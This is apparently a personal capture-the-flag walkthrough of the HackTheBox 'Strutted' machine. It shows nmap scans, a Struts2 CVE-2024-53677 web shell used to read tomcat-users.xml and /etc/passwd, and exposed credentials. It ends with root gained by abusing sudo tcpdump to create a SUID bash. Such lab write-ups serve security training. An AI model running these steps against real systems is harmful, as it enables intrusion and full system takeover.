@@ -1,0 +1,274 @@
+`#Nmap...`
+
+"Initial Scan"
+┌──(kali㉿kali)-[~/HackTheBox/Strutted]
+└─$ nmap -p- 10.10.11.59 --min-rate=1000
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-10 12:34 EDT
+Nmap scan report for 10.10.11.59
+Host is up (0.55s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+Nmap done: 1 IP address (1 host up) scanned in 91.39 seconds
+___________________________________________________________________________________________________________________________________________________________
+(I checked the site during the scan...)
+#resolving hostname 
+──(kali㉿kali)-[~/HackTheBox/Strutted]
+└─$ nano /etc/hosts
+10.10.11.59      strutted.htb
+___________________________________________________________________________________________________________________________________________________________
+"Further-Enumeration"
+┌──(kali㉿kali)-[~/HackTheBox/Strutted]
+└─$ nmap -p22,80 -sC -A 10.10.11.59 --min-rate=1000
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-10 12:37 EDT
+Nmap scan report for strutted.htb (10.10.11.59)
+Host is up (0.62s latency).
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Strutted\xE2\x84\xA2 - Instant Image Uploads
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+TRACEROUTE (using port 443/tcp)
+HOP RTT       ADDRESS
+1   667.30 ms 10.10.14.1
+2   668.60 ms strutted.htb (10.10.11.59)
+___________________________________________________________________________________________________________________________________________________________
+"Curl"
+┌──(kali㉿kali)-[~/HackTheBox/Strutted]
+└─$ curl -I  http://strutted.htb
+HTTP/1.1 200
+Server: nginx/1.18.0 (Ubuntu)
+Date: Wed, 10 Sep 2025 16:41:18 GMT
+Content-Type: text/html;charset=UTF-8
+Connection: keep-alive
+Vary: Sec-Fetch-Dest,Sec-Fetch-Mode,Sec-Fetch-Site,Sec-Fetch-User
+Cross-Origin-Embedder-Policy-Report-Only: require-corp
+Cross-Origin-Opener-Policy: same-origin
+Set-Cookie: JSESSIONID=80743287F18696A21A6FA3A042F04E36; Path=/; HttpOnly
+Content-Language: en-US
+___________________________________________________________________________________________________________________________________________________________
+"Going Further..."
+//We can find strutted.zip file in the download and in there we find many files ready to be burst open and examined//
+" after downloading teh file in domain "
+┌──(kali㉿kali)-[~/HackTheBox/Strutted]
+└─$ unzip strutted.zip
+"we have"                                                                                                                                                                     >
+┌──(kali㉿kali)-[~/HackTheBox/Strutted]
+└─$ ls
+context.xml  Dockerfile  README.md  strutted  strutted.zip  tomcat-users.xml                                                                                                                                                                             >
+┌──(kali㉿kali)-[~/HackTheBox/Strutted/strutted]
+└─$ ls
+mvnw  mvnw.cmd  pom.xml  src  target
+___________________________________________________________________________________________________________________________________________________________
+#Analyzing Contents 
+"inspecting tomcat-users.xml"
+└─$ cat tomcat-users.xml
+<?xml version='1.0' encoding='utf-8'?>
+<tomcat-users>
+    <role rolename="manager-gui"/>
+    <role rolename="admin-gui"/>
+    <user username="admin" password="skqKY6360z!Y" roles="manager-gui,admin-gui"/>
+</tomcat-users>
+___________________________________________________________________________________________________________________________________________________________
+"inspecting dockerfile"
+└─$ cat Dockerfile
+FROM --platform=linux/amd64 openjdk:17-jdk-alpine
+#FROM openjdk:17-jdk-alpine
+
+RUN apk add --no-cache maven
+
+COPY strutted /tmp/strutted
+WORKDIR /tmp/strutted
+
+RUN mvn clean package
+
+FROM tomcat:9.0
+
+RUN rm -rf /usr/local/tomcat/webapps/
+RUN mv /usr/local/tomcat/webapps.dist/ /usr/local/tomcat/webapps/
+RUN rm -rf /usr/local/tomcat/webapps/ROOT
+
+COPY --from=0 /tmp/strutted/target/strutted-1.0.0.war /usr/local/tomcat/webapps/ROOT.war
+COPY ./tomcat-users.xml /usr/local/tomcat/conf/tomcat-users.xml
+COPY ./context.xml /usr/local/tomcat/webapps/manager/META-INF/context.xml
+
+EXPOSE 8080
+
+CMD ["catalina.sh", "run"]
+___________________________________________________________________________________________________________________________________________________________
+"inspecting pom.xml"
+
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.a>
+    <modelVersion>4.0.0</modelVersion>
+
+    <packaging>war</packaging>
+
+    <artifactId>strutted</artifactId>
+    <groupId>org.strutted.htb</groupId>
+    <version>1.0.0</version>
+
+    <name>Strutted™</name>
+    <description>Instantly upload an image and receive a unique, shareable link. Keep your images secure, accessible, and easy to share—anywhere, anytime.</description>
+
+    <properties>
+        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
+        <maven.compiler.source>17</maven.compiler.source>
+        <maven.compiler.target>17</maven.compiler.target>
+        <struts2.version>6.3.0.1</struts2.version>.....
+                   
+                   *** Pretty Sure This is the Attack Vector ***
+___________________________________________________________________________________________________________________________________________________________
+"others"
+content.xml has some content nonsense
+readme.md has the steps on how to exploit the box
+mvnw has some bash script running
+mvnw.cmd I have no idea what that is
+___________________________________________________________________________________________________________________________________________________________
+#Debugging
+└─$ searchsploit  Struts2
+------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                                                    |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Apache Struts2 2.0.0 < 2.3.15 - Prefixed Parameters OGNL Injection                                                                                                | multiple/webapps/44583.txt
+Struts2/XWork < 2.2.0 - Remote Command Execution                                                                                                                  | multiple/remote/14360.txt
+------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+
+/*we can now upload an image in the wepage
+upon uploading the imaage we get the link but not really much help haha 
+      (I had to debug to upload the image as well haha.)*/
+___________________________________________________________________________________________________________________________________________________________
+
+https://raw.githubusercontent.com/TAM-K592/CVE-2024-53677-S2-067/refs/heads/ALOK/shell.jsp
+> After that i exploited and got a web cmd shell using the struts 2 exploit and   the server broke a couple of times lol
+We find find the exploit in:
+https://raw.githubusercontent.com/TAM-K592/CVE-2024-53677-S2-067/refs/heads/ALOK/shell.jsp
+https://www.exploit-db.com/exploits/44583
+___________________________________________________________________________________________________________________________________________________________
+"Enumeration"
+### FROM ###
+cmd=cat+conf/tomcat-users.xml
+### GOT ###
+//response
+ <user username="admin" password="<must-be-changed>" roles="manager-gui"/>
+  <user username="robot" password="<must-be-changed>" roles="manager-script"/>
+  <role rolename="manager-gui"/>
+  <role rolename="admin-gui"/>
+  <user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/>
+--->
+___________________________________________________________________________________________________________________________________________________________
+### FROM ###
+cmd=cat+/etc/passwd
+### GOT ###
+Command: cat /etc/passwd<BR>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+tomcat:x:998:998:Apache Tomcat:/var/lib/tomcat9:/usr/sbin/nologin
+james:x:1000:1000:Network Administrator:/home/james:/bin/bash
+_laurel:x:997:997::/var/log/laurel:/bin/false
+___________________________________________________________________________________________________________________________________________________________
+#SSH
+"we can now ssh as james with found credentials"
+┌──(kali㉿kali)-[~/HackTheBox/Strutted]
+└─$ ssh james@10.10.11.59
+james@10.10.11.59's password:
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-130-generic x86_64)
+___________________________________________________________________________________________________________________________________________________________
+#Privilege Escalation
+"checking priv"
+james@strutted:~$ sudo -l
+Matching Defaults entries for james on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User james may run the following commands on localhost:
+    (ALL) NOPASSWD: /usr/sbin/tcpdump
+    
+"You notice sudo allows tcpdump → research how tcpdump can run commands as root."
+___________________________________________________________________________________________________________________________________________________________
+"Privelege Esc.cmd"
+If you want to you use LinPEAS.sh as alternative…  [ Enumeration scripts like LinPEAS  save time.]
+
+james@strutted:~$ COMMAND='cp /bin/bash /tmp/bash_root && chmod +s /tmp/bash_root'
+
+" *** Provided a script ($TF) — root executed it. *** "
+			james@strutted:~$ TF=$(mktemp)
+			
+			james@strutted:~$ echo "$COMMAND" > $TF
+			
+			james@strutted:~$ chmod +x $TF
+" *** SUID shell (/tmp/bash_root) was created. *** "			
+
+			james@strutted:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+			tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+			Maximum file limit reached: 1
+			1 packet captured
+			4 packets received by filter
+			0 packets dropped by kernel
+___________________________________________________________________________________________________________________________________________________________
+   COMMAND=’cp /bin/bash /tmp/bash_root && chmod +s /tmp/bash_root’
+___________________________________________________________________________________________________________________________________________________________
+   Explanation:
+> **cp /bin/bash /tmp/bash_root**
+Copies the system bash binary (/bin/bash) to /tmp/bash_root (temporary folder). You now have a duplicate bash in /tmp/bash_root.
+> 
+**chmod +s /tmp/bash_root**
+> Sets the SUID bit on the copied bash. SUID (Set User ID) means anyone who runs this binary executes it as the file’s owner, not as the current user. Usually /bin/bash is owned by root, so after chmod +s, running /tmp/bash_root would give you a shell with root privileges.
+___________________________________________________________________________________________________________________________________________________________
+"Final Phase"
+james@strutted:~$ ls -la /tmp/bash_root
+-rwsr-sr-x 1 root root 1396520 Sep 13 07:28 /tmp/bash_root
+
+james@strutted:~$ /tmp/bash_root -p
+
+bash_root-5.1# id
+uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),27(sudo),1000(james)
+___________________________________________________________________________________________________________________________________________________________
+#user flag
+james@strutted:~$ cat user.txt
+94e79307d73582----------------
+#root flag
+bash_root-5.1# cat /root/root.txt
+9a5ffc6cc91eed------------------
